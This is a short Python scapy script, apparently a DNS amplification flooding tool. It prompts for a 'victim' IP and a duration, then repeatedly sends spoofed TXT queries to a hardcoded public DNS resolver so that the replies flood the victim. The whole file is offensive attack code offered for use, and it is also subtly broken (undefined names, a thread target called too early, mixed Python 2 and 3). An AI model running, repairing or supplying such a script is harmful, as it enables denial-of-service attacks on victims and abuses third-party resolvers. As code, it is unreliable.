from scapy.all import *
from threading import Thread
from thread import start_new_thread
import time

DNS_Server = ["88.134.228.33"];
run = true


def sendInfo(srcIP,dns):
    packet = IP(src=srcIP, dst=dns) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qtype=16,qname="google.com"));
    answer = sr1(packet, verbose=0);
    print( list(answer[IP]));
    print(len(packet));
    print(len(answer[IP]));

def repeat(ip):
    while run:
        dns = random.choice(DNS_Server);
        thread = Thread(target=sendInfo(),args=[ip,dns])
        thread.start()
        time.sleep(0.001)


sec = input("How much time should the IP be stressed? (seconds)");
ip = input("Whats the IP-Address of the victim?");
thread = Thread(target=repeat, args=[ip])
thread.start()
time.sleep(sec)
run = false;
print("done.")




